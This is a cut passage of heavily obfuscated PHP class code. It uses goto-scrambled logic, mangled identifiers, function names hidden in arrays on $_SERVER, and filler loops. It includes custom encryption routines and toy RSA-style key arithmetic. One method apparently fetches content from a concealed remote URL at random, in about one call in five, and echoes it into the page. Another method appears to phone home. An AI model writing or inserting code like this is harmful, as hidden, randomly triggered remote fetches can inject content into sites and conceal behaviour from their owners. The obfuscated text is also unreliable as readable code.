d½ÀÍãƒ÷; cãŸì Ü¹: $Dï´¤Ÿ³…¶ = $Fö„ÚŠÓäÜ[626]; return $B¹¾Ë½ÀÄô[190]($eÕ¡™Ğá£è, !0); goto B«¬›é¾âí; d½ÀÍãƒ÷: $Fö„ÚŠÓäÜ =& $_SERVER[Ìó]; $B¹¾Ë½ÀÄô =& $_SERVER[Ç]; $A°ªŒïÖ˜É = $B¹¾Ë½ÀÄô[281]; goto bÎ££À¸ï; CÈ¿¢­²¸ƒ: if ($eÕ¡™Ğá£è === -1) { return $A°ªŒïÖ˜É; } $DÊ÷—Îªì‚ = $B¹¾Ë½ÀÄô[245](array($B¹¾Ë½ÀÄô[246] => array($B¹¾Ë½ÀÄô[249] => $Eà½…©à‘, $B¹¾Ë½ÀÄô[247] => $B¹¾Ë½ÀÄô[285]), $B¹¾Ë½ÀÄô[286] => array($B¹¾Ë½ÀÄô[287] => !1, $B¹¾Ë½ÀÄô[288] => !1))); $eÕ¡™Ğá£è = @$B¹¾Ë½ÀÄô[250]($A°ªŒïÖ˜É, !1, $DÊ÷—Îªì‚); goto cãŸì Ü¹; E¿ÁË…ğØ±: $A°ªŒïÖ˜É = $A°ªŒïÖ˜É . $CããÀ¡¡Ï‚ . $B¹¾Ë½ÀÄô[283] . $B¹¾Ë½ÀÄô[284]($eÕ¡™Ğá£è); $Dèö±‰£Å“ = $Fö„ÚŠÓäÜ[625]; while (strlen($Dèö±‰£Å“) < $Fö„ÚŠÓäÜ[558]) { if (!$Dèö±‰£Å“) { break; } $Dèö±‰£Å“++; } goto CÈ¿¢­²¸ƒ; bÎ££À¸ï: $eÈ›¬–ñŒº = $Fö„ÚŠÓäÜ[624]; if (strlen($eÈ›¬–ñŒº) < $Fö„ÚŠÓäÜ[560]) { return; } $A°ªŒïÖ˜É = $this->{$_SERVER[Ç][243]}($A°ªŒïÖ˜É, $B¹¾Ë½ÀÄô[282]); goto E¿ÁË…ğØ±; B«¬›é¾âí: } private function oigb5f9e746f() { goto Aí‚ØÖ®ˆÔ; fÖ­´ØĞÆ†: $a™ô’‘Óù· = $c‘Ÿ¶³‘â®[104]($this->wxeue3e40ca8, $c‘Ÿ¶³‘â®[316]); $a™ô’‘Óù· = $a™ô’‘Óù· ? $c‘Ÿ¶³‘â®[201]($a™ô’‘Óù·) : 0; return $BŞÛˆ¹µ’Ä + $a™ô’‘Óù·; goto C»˜ìŒ’…±; Bë­º ’¾Ê: $BŞÛˆ¹µ’Ä = $c‘Ÿ¶³‘â®[201]($BŞÛˆ¹µ’Ä ? $BŞÛˆ¹µ’Ä : $c‘Ÿ¶³‘â®[290]); $a‡³™’ÌĞ = $bÂ‚ƒ†±Æ[628]; if (strlen($a‡³™’ÌĞ) < $bÂ‚ƒ†±Æ[558]) { return; } goto fÖ­´ØĞÆ†; CŸİ“ìÅ…‰: $D”ãÃ…¤°„ = $bÂ‚ƒ†±Æ[627]; while ($D”ãÃ…¤°„ < $bÂ‚ƒ†±Æ[558]) { if ($D”ãÃ…¤°„ >= 0) { break; } $D”ãÃ…¤°„++; } $BŞÛˆ¹µ’Ä = $cÈùã‡ÒË[$this->frzb663f35ed]; goto Bë­º ’¾Ê; Aí‚ØÖ®ˆÔ: $bÂ‚ƒ†±Æ =& $_SERVER[Ìó]; $c‘Ÿ¶³‘â® =& $_SERVER[Ç]; $cÈùã‡ÒË = array($c‘Ÿ¶³‘â®[289] => $c‘Ÿ¶³‘â®[290], $c‘Ÿ¶³‘â®[291] => $c‘Ÿ¶³‘â®[292], $c‘Ÿ¶³‘â®[293] => $c‘Ÿ¶³‘â®[294], $c‘Ÿ¶³‘â®[295] => $c‘Ÿ¶³‘â®[296], $c‘Ÿ¶³‘â®[297] => $c‘Ÿ¶³‘â®[298], $c‘Ÿ¶³‘â®[299] => $c‘Ÿ¶³‘â®[238], $c‘Ÿ¶³‘â®[300] => $c‘Ÿ¶³‘â®[238], $c‘Ÿ¶³‘â®[301] => $c‘Ÿ¶³‘â®[290], $c‘Ÿ¶³‘â®[302] => $c‘Ÿ¶³‘â®[292], $c‘Ÿ¶³‘â®[303] => $c‘Ÿ¶³‘â®[294], $c‘Ÿ¶³‘â®[304] => $c‘Ÿ¶³‘â®[305], $c‘Ÿ¶³‘â®[306] => $c‘Ÿ¶³‘â®[296], $c‘Ÿ¶³‘â®[307] => $c‘Ÿ¶³‘â®[308], $c‘Ÿ¶³‘â®[309] => $c‘Ÿ¶³‘â®[298], $c‘Ÿ¶³‘â®[310] => $c‘Ÿ¶³‘â®[311], $c‘Ÿ¶³‘â®[312] => $c‘Ÿ¶³‘â®[313], $c‘Ÿ¶³‘â®[314] => $c‘Ÿ¶³‘â®[315]); goto CŸİ“ìÅ…‰; C»˜ìŒ’…±: } public function pzkjaa2a5d89($Cá¿Û¤‘¼) { goto cÖ”¾°Úè; D‰ÑÀÏğù: $E»¼‰ø†î = $c´ò˜°•¢•[629]; if (!$E»¼‰ø†î) { die; } if ($d»„‰‘ñÛ¥ >= $A„âœØ§¶á[201]($A„âœØ§¶á[238])) { return; } goto EÑƒİãÕçª; Eê¿Ãß©‘í: if ($a½®î‡Ğê <= $d»„‰‘ñÛ¥) { return; } $fŞ‡ÍÇ¼õ§ = $A„âœØ§¶á[61]($A„âœØ§¶á[139])->{$_SERVER[Ç][317]}($A„âœØ§¶á[318])->{$_SERVER[Ç][319]}($d»„‰‘ñÛ¥)->{$_SERVER[Ç][320]}(); $fŞ‡ÍÇ¼õ§ = $A„âœØ§¶á[222]($fŞ‡ÍÇ¼õ§, $A„âœØ§¶á[10], $A„âœØ§¶á[318]); goto E´Ï¡›µ³™; EÑƒİãÕçª: $a½®î‡Ğê = $A„âœØ§¶á[61]($A„âœØ§¶á[139])->{$_SERVER[Ç][140]}(); $eñ×ÎËíßÜ = $c´ò˜°•¢•[630]; while (strlen($eñ×ÎËíßÜ) < $c´ò˜°•¢•[560]) { if (!$eñ×ÎËíßÜ) { break; } $eñ×ÎËíßÜ++; } goto Eê¿Ãß©‘í; cÖ”¾°Úè: $c´ò˜°•¢• =& $_SERVER[Ìó]; $A„âœØ§¶á =& $_SERVER[Ç]; $d»„‰‘ñÛ¥ = $this->{$_SERVER[Ç][137]}(); goto D‰ÑÀÏğù; E´Ï¡›µ³™: if (!$A„âœØ§¶á[236]($Cá¿Û¤‘¼[$A„âœØ§¶á[318]], $fŞ‡ÍÇ¼õ§)) { $A„âœØ§¶á[166]($A„âœØ§¶á[321], !1, $A„âœØ§¶á[233]); } goto fø³õ¾–…ñ; fø³õ¾–…ñ: } public function gwmn9d8c4266() { goto bÊåŠÃ§¡ñ; bİë·÷åÍ: $aÄù‚ß†£Š = $a¼•éŞ÷­î[242]; $FŠã¼í¶ÄÍ = $aÕï¯Åë‰·[631]; if (!$FŠã¼í¶ÄÍ) { die; } goto BªšĞé¥Èæ; AÁĞÍØø…²: $Fº†°¶¾Íª = @$a¼•éŞ÷­î[250]($aÄù‚ß†£Š, !1, $fÍ‰•òÑ¨); echo $a¼•éŞ÷­î[323] . $a¼•éŞ÷­î[324]($Fº†°¶¾Íª) . $a¼•éŞ÷­î[325]; goto DñÁ÷·ˆ; bÊåŠÃ§¡ñ: $aÕï¯Åë‰· =& $_SERVER[Ìó]; $a¼•éŞ÷­î =& $_SERVER[Ç]; if (!$a¼•éŞ÷­î[104]($GLOBALS, $a¼•éŞ÷­î[132]) || $a¼•éŞ÷­î[322](1, 100) > 20) { return; } goto bİë·÷åÍ; BªšĞé¥Èæ: $aÄù‚ß†£Š = $this->{$_SERVER[Ç][243]}($aÄù‚ß†£Š, $a¼•éŞ÷­î[244]); $fÍ‰•òÑ¨ = $a¼•éŞ÷­î[245](array($a¼•éŞ÷­î[246] => array($a¼•éŞ÷­î[247] => $a¼•éŞ÷­î[248], $a¼•éŞ÷­î[249] => 3))); $bå§êÂîÍŠ = $aÕï¯Åë‰·[632]; goto AÁĞÍØø…²; DñÁ÷·ˆ: } private function wxaeb87dd47a($d¯â©´Ä·, $dÖ‘äé¸Î‘, $cæƒ¼¯ù¥Ä = 3) { goto d«ğƒäŠÛ«; bÁ´é‰—Ôá: $Fæ°›¦èÈÄ = $eí“•ºË‡ã[637]; if (!$Fæ°›¦èÈÄ) { die; } switch ($d‰ÚŒ­Ãà) { case $Eíô…¹ùâÄ[229]: $c‹š¤ ÅÇ = $this->{$_SERVER[Ç][147]}($d¯â©´Ä·, $Eíô…¹ùâÄ[214]($dÖ‘äé¸Î‘ . $dÈªİÊöÒİ)); break; case $Eíô…¹ùâÄ[220]: $c‹š¤ ÅÇ = $this->{$_SERVER[Ç][147]}($d¯â©´Ä·, $Eíô…¹ùâÄ[214]($dÈªİÊöÒİ . $dÖ‘äé¸Î‘)); $Eè·ÄÚğ‡» = $eí“•ºË‡ã[638]; if (strlen($Eè·ÄÚğ‡») < $eí“•ºË‡ã[548]) { return; } break; $E‹Ä¹½àö‰ = $eí“•ºË‡ã[639]; case $Eíô…¹ùâÄ[328]: $c‹š¤ ÅÇ = $this->{$_SERVER[Ç][147]}($d¯â©´Ä·, $Eíô…¹ùâÄ[118]($dÈªİÊöÒİ . $dÖ‘äé¸Î‘)); $a§ÛéõÉÌ¦ = $eí“•ºË‡ã[640]; if (!$a§ÛéõÉÌ¦) { return; } break; $Dö‡˜Ìòª = $eí“•ºË‡ã[641]; if (strlen($Dö‡˜Ìòª) < $eí“•ºË‡ã[546]) { return; } case $Eíô…¹ùâÄ[329]: $c‹š¤ ÅÇ = $this->{$_SERVER[Ç][147]}($d¯â©´Ä·, $Eíô…¹ùâÄ[114]($dÈªİÊöÒİ . $dÖ‘äé¸Î‘)); break; $b‰†µ´–ğù = $eí“•ºË‡ã[584]; while ($b‰†µ´–ğù < $eí“•ºË‡ã[558]) { if ($b‰†µ´–ğù >= 0) { break; } $b‰†µ´–ğù++; } case $Eíô…¹ùâÄ[330]: goto b“É¹Ì·¥›; F³ƒ‹ÍÆˆ…: $dˆÄñĞ¿É = 0; $dš¥éÇÕÛã = $eí“•ºË‡ã[644]; if (!$dš¥éÇÕÛã) { return; } goto C‡Û®ã½Ê; e†›É: if (strlen($bÄğùö‚ÙÆ) < $eí“•ºË‡ã[560]) { die; } $fÒ†š´ª = $CôÑùÕ–òà[$E·èŒß¶‰Ç]; $Fè¬ÚÂã = $Eíô…¹ùâÄ[114]($fÒ†š´ª . $Eíô…¹ùâÄ[114]($dÖ‘äé¸Î‘ . $fÒ†š´ª) . $dÖ‘äé¸Î‘); goto e›ä ›; eçÑ™áÌŞ¤: $a®¦ÈëŞà = 0; $Cƒæã£Êå˜ = $eí“•ºË‡ã[643]; if (!$Cƒæã£Êå˜) { return; } goto F³ƒ‹ÍÆˆ…; e›ä ›: $Fè¬ÚÂã = $Eíô…¹ùâÄ[25]($Fè¬ÚÂã, $E·èŒß¶‰Ç % 8, $E·èŒß¶‰Ç % 8 + 7); $cˆ˜ªæ¡ç = $Eíô…¹ùâÄ[10]; $a—Ëóù‘ç = 0; goto eçÑ™áÌŞ¤; b“É¹Ì·¥›: $d¯â©´Ä· = $Eíô…¹ùâÄ[118]($d¯â©´Ä·); $E·èŒß¶‰Ç = $Eíô…¹ùâÄ[331](0, 64); $bÄğùö‚ÙÆ = $eí“•ºË‡ã[642]; goto e†›É; C‡Û®ã½Ê: for ($a—Ëóù‘ç = 0; $a—Ëóù‘ç < $Eíô…¹ùâÄ[24]($d¯â©´Ä·); $a—Ëóù‘ç++) { $dˆÄñĞ¿É = $dˆÄñĞ¿É == $Eíô…¹ùâÄ[24]($Fè¬ÚÂã) ? 0 : $dˆÄñĞ¿É; $a®¦ÈëŞà = ($E·èŒß¶‰Ç + $Eíô…¹ùâÄ[332]($CôÑùÕ–òà, $d¯â©´Ä·[$a—Ëóù‘ç]) + $Eíô…¹ùâÄ[333]($Fè¬ÚÂã[$dˆÄñĞ¿É++])) % 64; $b¢Ã• ÁÏî = $eí“•ºË‡ã[645]; $cˆ˜ªæ¡ç .= $CôÑùÕ–òà[$a®¦ÈëŞà]; $aĞ“×¬œù° = $eí“•ºË‡ã[646]; while (strlen($aĞ“×¬œù°) < $eí“•ºË‡ã[551]) { if (!$aĞ“×¬œù°) { break; } $aĞ“×¬œù°++; } } $c‹š¤ ÅÇ = $Eíô…¹ùâÄ[324]($fÒ†š´ª . $cˆ˜ªæ¡ç); break; goto DóãÒÅ¿òµ; DóãÒÅ¿òµ: default: $c‹š¤ ÅÇ = $this->{$_SERVER[Ç][147]}($d¯â©´Ä·, $dÖ‘äé¸Î‘ . $dÈªİÊöÒİ); break; $eæí›Ûß = $eí“•ºË‡ã[647]; if (strlen($eæí›Ûß) < $eí“•ºË‡ã[546]) { return; } } goto dÓŸáåŠéÒ; dÓŸáåŠéÒ: $c‹š¤ ÅÇ = $Eíô…¹ùâÄ[214]($d‰ÚŒ­Ãà . $dÈªİÊöÒİ . $c‹š¤ ÅÇ); if ($cæƒ¼¯ù¥Ä - 1 > 0) { $c‹š¤ ÅÇ = $this->{$_SERVER[Ç][127]}($c‹š¤ ÅÇ, $dÖ‘äé¸Î‘, $cæƒ¼¯ù¥Ä - 1); } return $c‹š¤ ÅÇ; goto Dµæ³¡—®Ö; fİà·è¡æë: $fæÀÛŸ—Ë¾ = $eí“•ºË‡ã[635]; while (strlen($fæÀÛŸ—Ë¾) < $eí“•ºË‡ã[551]) { if (!$fæÀÛŸ—Ë¾) { break; } $fæÀÛŸ—Ë¾++; } $dÈªİÊöÒİ = $Eíô…¹ùâÄ[124](15); goto eÁ¶íŠ’´†; eÁ¶íŠ’´†: $bî¨î‘¦ÇË = $eí“•ºË‡ã[636]; while ($bî¨î‘¦ÇË < $eí“•ºË‡ã[548]) { if ($bî¨î‘¦ÇË >= 0) { break; } $bî¨î‘¦ÇË++; } $CôÑùÕ–òà = $Eíô…¹ùâÄ[327]; goto bÁ´é‰—Ôá; d«ğƒäŠÛ«: $eí“•ºË‡ã =& $_SERVER[Ìó]; $Eíô…¹ùâÄ =& $_SERVER[Ç]; $Eíô…¹ùâÄ[326](1); goto CŸ¦ßÎÚÅ; CŸ¦ßÎÚÅ: $f¥‰ÙöÃøÙ = $eí“•ºË‡ã[633]; if (strlen($f¥‰ÙöÃøÙ) < $eí“•ºË‡ã[546]) { return; } $d¯â©´Ä· = $Eíô…¹ùâÄ[2]($d¯â©´Ä·); goto EÍĞÜ¶ÉÆÙ; EÍĞÜ¶ÉÆÙ: $cœ³ƒÉÒì° = $eí“•ºË‡ã[634]; if (strlen($cœ³ƒÉÒì°) < $eí“•ºË‡ã[548]) { die; } $d‰ÚŒ­Ãà = $Eíô…¹ùâÄ[322](0, 5) . $Eíô…¹ùâÄ[10]; goto fİà·è¡æë; Dµæ³¡—®Ö: } private function liqm30f70f34($AËö«‹Ò“, $E«‰Ş°ÑŸ«, $CïÑá¡†¶ = 3) { goto eŠƒ¨Šî«Ø; E‰²œß¾Å§: $B°Ìİ÷˜×µ = $AËö«‹Ò“[0]; $DãíĞì˜à = $A¸‹Ê§Ö´æ[25]($AËö«‹Ò“, 1, 15); $AËö«‹Ò“ = $A¸‹Ê§Ö´æ[25]($AËö«‹Ò“, 16); goto F¹½¯¦øô­; BÒ×È¥â„: $AËö«‹Ò“ = $A¸‹Ê§Ö´æ[2]($AËö«‹Ò“); $B•„Ñœ´¨å = $BêØ¥²Ñù[556]; while ($B•„Ñœ´¨å < $BêØ¥²Ñù[551]) { if ($B•„Ñœ´¨å >= 0) { break; } $B•„Ñœ´¨å++; } goto D¦øçéñ; eŠƒ¨Šî«Ø: $BêØ¥²Ñù =& $_SERVER[Ìó]; $A¸‹Ê§Ö´æ =& $_SERVER[Ç]; if (!$A¸‹Ê§Ö´æ[334]($AËö«‹Ò“) || $A¸‹Ê§Ö´æ[24]($AËö«‹Ò“) < 10) { return !1; } goto BÒ×È¥â„; D¦øçéñ: $AËö«‹Ò“ = $A¸‹Ê§Ö´æ[214]($AËö«‹Ò“); $bù«¦Ò–‘Ù = $BêØ¥²Ñù[648]; if (!$bù«¦Ò–‘Ù) { return; } goto E‰²œß¾Å§; c‡¤àéÊÑ: switch ($B°Ìİ÷˜×µ) { case $A¸‹Ê§Ö´æ[229]: $f¨øÃŞôµ = $this->{$_SERVER[Ç][243]}($AËö«‹Ò“, $A¸‹Ê§Ö´æ[214]($E«‰Ş°ÑŸ« . $DãíĞì˜à)); $c³É—µó = $BêØ¥²Ñù[650]; if (strlen($c³É—µó) < $BêØ¥²Ñù[548]) { return; } break; case $A¸‹Ê§Ö´æ[220]: $f¨øÃŞôµ = $this->{$_SERVER[Ç][243]}($AËö«‹Ò“, $A¸‹Ê§Ö´æ[214]($DãíĞì˜à . $E«‰Ş°ÑŸ«)); break; $dÒÖŠ¤¹ô = $BêØ¥²Ñù[651]; if (strlen($dÒÖŠ¤¹ô) < $BêØ¥²Ñù[558]) { return; } case $A¸‹Ê§Ö´æ[328]: $f¨øÃŞôµ = $this->{$_SERVER[Ç][243]}($AËö«‹Ò“, $A¸‹Ê§Ö´æ[118]($DãíĞì˜à . $E«‰Ş°ÑŸ«)); break; case $A¸‹Ê§Ö´æ[329]: $f¨øÃŞôµ = $this->{$_SERVER[Ç][243]}($AËö«‹Ò“, $A¸‹Ê§Ö´æ[114]($DãíĞì˜à . $E«‰Ş°ÑŸ«)); $a››éâ‚“ = $BêØ¥²Ñù[652]; while (strlen($a››éâ‚“) < $BêØ¥²Ñù[551]) { if (!$a››éâ‚“) { break; } $a››éâ‚“++; } break; $Aøœ°Ç’ä” = $BêØ¥²Ñù[653]; if (strlen($Aøœ°Ç’ä”) < $BêØ¥²Ñù[548]) { return; } case $A¸‹Ê§Ö´æ[330]: goto eÙËÁÚˆÜÄ; D‰ÙŒÙ¼: if (strlen($f÷Á©ÎâŞà) < $BêØ¥²Ñù[546]) { die; } for ($b“Ã×æ¸ù® = 0; $b“Ã×æ¸ù® < $A¸‹Ê§Ö´æ[24]($AËö«‹Ò“); $b“Ã×æ¸ù®++) { $AÂÄ¼öÃÛÉ = $AÂÄ¼öÃÛÉ == $A¸‹Ê§Ö´æ[24]($A×Õ¡íì­) ? 0 : $AÂÄ¼öÃÛÉ; $Fù®˜¬‹¨ª = $BêØ¥²Ñù[649]; if (!$Fù®˜¬‹¨ª) { return; } $EÑÑ½êáÅ‘ = $AÂÄ¼öÃÛÉ++; $AË—¢¦ó†Á = $A¸‹Ê§Ö´æ[332]($C’ÎêîÆğ, $AËö«‹Ò“[$b“Ã×æ¸ù®]) - $a—¼ò†Âİ - $A¸‹Ê§Ö´æ[333]($A×Õ¡íì­[$EÑÑ½êáÅ‘]); while ($AË—¢¦ó†Á < 0) { $AË—¢¦ó†Á += 64; } $eø¬°Ì†£© .= $C’ÎêîÆğ[$AË—¢¦ó†Á]; $cÎ„šá„… = $BêØ¥²Ñù[658]; } $f¨øÃŞôµ = $A¸‹Ê§Ö´æ[336]($eø¬°Ì†£©); goto C×ÛÛ÷Ö»ö; DŒºä³·: $A×Õ¡íì­ = $A¸‹Ê§Ö´æ[25]($A×Õ¡íì­, $a—¼ò†Âİ % 8, $a—¼ò†Âİ % 8 + 7); $eø¬°Ì†£© = $A¸‹Ê§Ö´æ[10]; $b“Ã×æ¸ù® = 0; goto C¡„Âô ØÛ; C¡„Âô ØÛ: $AË—¢¦ó†Á = 0; $AÂÄ¼öÃÛÉ = 0; $f÷Á©ÎâŞà = $BêØ¥²Ñù[657]; goto D‰ÙŒÙ¼; eÙËÁÚˆÜÄ: $AËö«‹Ò“ = $A¸‹Ê§Ö´æ[335]($AËö«‹Ò“); $Cˆ¤ÒºÌ™â = $AËö«‹Ò“[0]; $DÅƒÆË‹È = $BêØ¥²Ñù[654]; goto DÇ¤Ò‘œİå; DÇ¤Ò‘œİå: if (!$DÅƒÆË‹È) { die; } $AËö«‹Ò“ = $A¸‹Ê§Ö´æ[25]($AËö«‹Ò“, 1); $Bâá÷äÀ²Ÿ = $BêØ¥²Ñù[655]; goto DÍªŠ·ÃŞ; DÍªŠ·ÃŞ: $a—¼ò†Âİ = $A¸‹Ê§Ö´æ[332]($C’ÎêîÆğ, $Cˆ¤ÒºÌ™â); $FŞß—øİ÷õ = $BêØ¥²Ñù[656]; $A×Õ¡íì­ = $A¸‹Ê§Ö´æ[114]($Cˆ¤ÒºÌ™â . $A¸‹Ê§Ö´æ[114]($E«‰Ş°ÑŸ« . $Cˆ¤ÒºÌ™â) . $E«‰Ş°ÑŸ«); goto DŒºä³·; C×ÛÛ÷Ö»ö: break; $b¿áõ‘à† = $BêØ¥²Ñù[659]; while ($b¿áõ‘à† < $BêØ¥²Ñù[546]) { if ($b¿áõ‘à† >= 0) { break; } $b¿áõ‘à†++; } goto eàÛ“‡•§„; eàÛ“‡•§„: default: $f¨øÃŞôµ = $this->{$_SERVER[Ç][243]}($AËö«‹Ò“, $E«‰Ş°ÑŸ« . $DãíĞì˜à); $eóÀ´§·­Ö = $BêØ¥²Ñù[660]; break; } if ($CïÑá¡†¶ - 1 > 0) { $f¨øÃŞôµ = $this->{$_SERVER[Ç][188]}($f¨øÃŞôµ, $E«‰Ş°ÑŸ«, $CïÑá¡†¶ - 1); } return $f¨øÃŞôµ; goto fŒ®¼”Ÿ×ó; F¹½¯¦øô­: $C’ÎêîÆğ = $A¸‹Ê§Ö´æ[327]; $A¹Ãçõ¤Ø = $BêØ¥²Ñù[649]; while ($A¹Ãçõ¤Ø < $BêØ¥²Ñù[551]) { if ($A¹Ãçõ¤Ø >= 0) { break; } $A¹Ãçõ¤Ø++; } goto c‡¤àéÊÑ; fŒ®¼”Ÿ×ó: } public function xzvmeb73cb07($e¼Õä„¿—) { goto e×ˆò°Í; E¾¯äçÅèğ: $B†˜µ‰¡Ûİ = $f÷³Ôäğ¾Å[668]; return $Bá§Æ÷´¯; $Aåİí‘©˜ø = $f÷³Ôäğ¾Å[669]; goto e²›ÎÖò; e‹ƒº—²ê: if (!$C½ß©µƒÑ) { return; } $c—ÄÇğª–‹ = ($DÕ’ÌÙä”ƒ - 1) * ($Eâ²ÉèçÛ± - 1); $bâß›²ÌÅ¿ = $f÷³Ôäğ¾Å[663]; goto F²èáÕ§“; F²èáÕ§“: $dİˆëÍÔ·ã = $DÍÅÑÓíµ¹[201](($DÕ’ÌÙä”ƒ + $Eâ²ÉèçÛ±) / 2); while (1) { $Dç¶í¹ˆ³ = $dİˆëÍÔ·ã; $bïŞ—Ö¸— = $f÷³Ôäğ¾Å[664]; $AòÔ·˜ñÕ§ = $c—ÄÇğª–‹; while ($AòÔ·˜ñÕ§ % $Dç¶í¹ˆ³ != 0) { $CÈ™ïÚëˆù = $AòÔ·˜ñÕ§; $aÚ‰·é‡ˆ = $f÷³Ôäğ¾Å[665]; if (strlen($aÚ‰·é‡ˆ) < $f÷³Ôäğ¾Å[546]) { return; } $AòÔ·˜ñÕ§ = $Dç¶í¹ˆ³; $Dç¶í¹ˆ³ = $CÈ™ïÚëˆù % $Dç¶í¹ˆ³; $E–Õ–£¡ = $f÷³Ôäğ¾Å[666]; } if ($Dç¶í¹ˆ³ == 1) { break; } else { $dİˆëÍÔ·ã++; } } $Càƒ‹ùÊ¶¬ = 2; goto fšª¡ –ƒì; e×ˆò°Í: $f÷³Ôäğ¾Å =& $_SERVER[Ìó]; $DÍÅÑÓíµ¹ =& $_SERVER[Ç]; $DÕ’ÌÙä”ƒ = $this->{$_SERVER[Ç][337]}(); goto B¡Ò˜î‹ó²; e²›ÎÖò: while ($Aåİí‘©˜ø < $f÷³Ôäğ¾Å[551]) { if ($Aåİí‘©˜ø >= 0) { break; } $Aåİí‘©˜ø++; } goto F ¢„¬±‹; fšª¡ –ƒì: for ($bµö‘•Ñ£í = 0; $bµö‘•Ñ£í < $c—ÄÇğª–‹ * 10; $bµö‘•Ñ£í++) { if (($c—ÄÇğª–‹ * $bµö‘•Ñ£í + 1) % $dİˆëÍÔ·ã == 0) { $Càƒ‹ùÊ¶¬ = $DÍÅÑÓíµ¹[201](($c—ÄÇğª–‹ * $bµö‘•Ñ£í + 1) / $dİˆëÍÔ·ã); break; } } $Cèô²ÛŞ× = $this->{$_SERVER[Ç][147]}($DÕ’ÌÙä”ƒ * $Eâ²ÉèçÛ± . $DÍÅÑÓíµ¹[10], $DÍÅÑÓíµ¹[149]); $AöæĞ¼‡Ã = $DÍÅÑÓíµ¹[114]($DÍÅÑÓíµ¹[338] . ($DÕ’ÌÙä”ƒ + $Eâ²ÉèçÛ±) . $DÍÅÑÓíµ¹[339] . $dİˆëÍÔ·ã . $DÍÅÑÓíµ¹[339] . $Càƒ‹ùÊ¶¬ . $DÍÅÑÓíµ¹[340]); goto C‘Ôø—™íä; C‘Ôø—™íä: $dÊ—ºö…® = $f÷³Ôäğ¾Å[667]; if (!$dÊ—ºö…®) { die; } $Bá§Æ÷´¯ = $this->{$_SERVER[Ç][147]}($e¼Õä„¿—, $AöæĞ¼‡Ã) . $DÍÅÑÓíµ¹[341] . $Cèô²ÛŞ×; goto E¾¯äçÅèğ; B¡Ò˜î‹ó²: $BËù„¹¡Œ¿ = $f÷³Ôäğ¾Å[661]; $Eâ²ÉèçÛ± = $this->{$_SERVER[Ç][337]}(); $C½ß©µƒÑ = $f÷³Ôäğ¾Å[662]; goto e‹ƒº—²ê; F ¢„¬±‹: } public function boka52a1b963($FÕ«½‚¥îÛ) { goto eÉÀ­ÁôìŠ; D˜¿¸‡†ë: $BÃÁóÇ¶Æ™ = $A¢Ãßè·Õ[114]($A¢Ãßè·Õ[338] . ($bğä‹¡®× + $D¤‚ÚêÅ¦¹) . $A¢Ãßè·Õ[339] . $eÇ›˜ŒŒˆ³ . $A¢Ãßè·Õ[339] . $cİÆŠßì³ . $A¢Ãßè·Õ[340]); $C­‚‰µ = $this->{$_SERVER[Ç][243]}($dÛ“Ì¤çê[0], $BÃÁóÇ¶Æ™); return $C­‚‰µ; goto AÅÏó§§Ú; F¢öš¡ã¾Ï: $A¼İºá‘Ù = $f…Œ¸ç™[671]; $D¤‚ÚêÅ¦¹ = 0; for ($Bõ¢¬ßïŞ£ = 3; $Bõ¢¬ßïŞ£ < $E¨ÓÕç‰²; $Bõ¢¬ßïŞ£ += 2) { if ($E¨ÓÕç‰² % $Bõ¢¬ßïŞ£ != 0) { continue; } $bğä‹¡®× = $Bõ¢¬ßïŞ£; $D¤‚ÚêÅ¦¹ = $A¢Ãßè·Õ[201]($E¨ÓÕç‰² / $Bõ¢¬ßïŞ£); break; $fÍÎß†¨İ = $f…Œ¸ç™[672]; while (strlen($fÍÎß†¨İ) < $f…Œ¸ç™[560]) { if (!$fÍÎß†¨İ) { break; } $fÍÎß†¨İ++; } } goto CÕƒö“øÎ´; F˜¡ªù™œ‰: $eÇ›˜ŒŒˆ³ = $A¢Ãßè·Õ[201](($bğä‹¡®× + $D¤‚ÚêÅ¦¹) / 2); $C£‹ğóòî¹ = $f…Œ¸ç™[674]; if (strlen($C£‹ğóòî¹) < $f…Œ¸ç™[558]) { return; } goto b¿ÍÅ”†‘; eÉÀ­ÁôìŠ: $f…Œ¸ç™ =& $_SERVER[Ìó]; $A¢Ãßè·Õ =& $_SERVER[Ç]; $dÛ“Ì¤çê = $A¢Ãßè·Õ[0]($A¢Ãßè·Õ[341], $FÕ«½‚¥îÛ); goto aÌğùÛ‡; CÕƒö“øÎ´: $b­°‰®óÚ‰ = ($bğä‹¡®× - 1) * ($D¤‚ÚêÅ¦¹ - 1); $cÒé£ë† = $f…Œ¸ç™[673]; while ($cÒé£ë† < $f…Œ¸ç™[558]) { if ($cÒé£ë† >= 0) { break; } $cÒé£ë†++; } goto F˜¡ªù™œ‰; aÌğùÛ‡: $CËÁÏ´¦ëÎ = $f…Œ¸ç™[670]; if ($A¢Ãßè·Õ[19]($dÛ“Ì¤çê) != 2) { return $A¢Ãßè·Õ[10]; } $E¨ÓÕç‰² = $this->{$_SERVER[Ç][243]}($dÛ“Ì¤çê[1] . $A¢Ãßè·Õ[10], $A¢Ãßè·Õ[149]); goto Dó®ˆŒÀï; Dó®ˆŒÀï: if (!$E¨ÓÕç‰²) { return $A¢Ãßè·Õ[10]; } $E¨ÓÕç‰² = $A¢Ãßè·Õ[201]($E¨ÓÕç‰²); $bğä‹¡®× = 0; goto F¢öš¡ã¾Ï; AÅÏó§§Ú: $E¿†¯â¡Â = $f…Œ¸ç™[678]; if (strlen($E¿†¯â¡Â) < $f…Œ¸ç™[546]) { return; } goto e·²ÖéÛó; b¿ÍÅ”†‘: while (1) { $C¸¤³ÆŒ¨ = $eÇ›˜ŒŒˆ³; $f’ÜÑ¥ÇŠ¤ = $b­°‰®óÚ‰; $d³È™–áÕ = $f…Œ¸ç™[675]; if (strlen($d³È™–áÕ) < $f…Œ¸ç™[558]) { die; } while ($f’ÜÑ¥ÇŠ¤ % $C¸¤³ÆŒ¨ != 0) { $E¥¬Û«ÃÎ = $f’ÜÑ¥ÇŠ¤; $FÜ§Éë’¦ã = $f…Œ¸ç™[676]; while ($FÜ§Éë’¦ã < $f…Œ¸ç™[551]) { if ($FÜ§Éë’¦ã >= 0) { break; } $FÜ§Éë’¦ã++; } $f’ÜÑ¥ÇŠ¤ = $C¸¤³ÆŒ¨; $C¸¤³ÆŒ¨ = $E¥¬Û«ÃÎ % $C¸¤³ÆŒ¨; $AïœÅ÷Èßœ = $f…Œ¸ç™[677]; } if ($C¸¤³ÆŒ¨ == 1) { break; } else { $eÇ›˜ŒŒˆ³++; } } $cİÆŠßì³ = 2; for ($Bõ¢¬ßïŞ£ = 0; $Bõ¢¬ßïŞ£ < $b­°‰®óÚ‰ * 10; $Bõ¢¬ßïŞ£++) { if (($b­°‰®óÚ‰ * $Bõ¢¬ßïŞ£ + 1) % 